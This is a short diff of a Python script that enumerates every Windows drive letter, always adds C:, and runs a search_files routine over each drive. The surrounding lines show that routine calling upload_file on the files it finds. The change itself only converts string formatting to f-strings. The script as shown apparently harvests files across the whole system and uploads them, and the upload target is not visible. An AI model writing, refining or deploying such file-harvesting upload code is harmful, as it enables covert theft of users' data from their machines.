@@ -46,7 +46,9 @@ def search_files(directory):
                 upload_file(file_path)
 
 # Call search_files for all drives, including the main system drive (C:\)
-drives = ['%s:' % d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:' % d)]
+drives = [
+    f'{d}:' for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f'{d}:')
+]
 if 'C:' not in drives:
     drives.append('C:')
 for drive in drives:
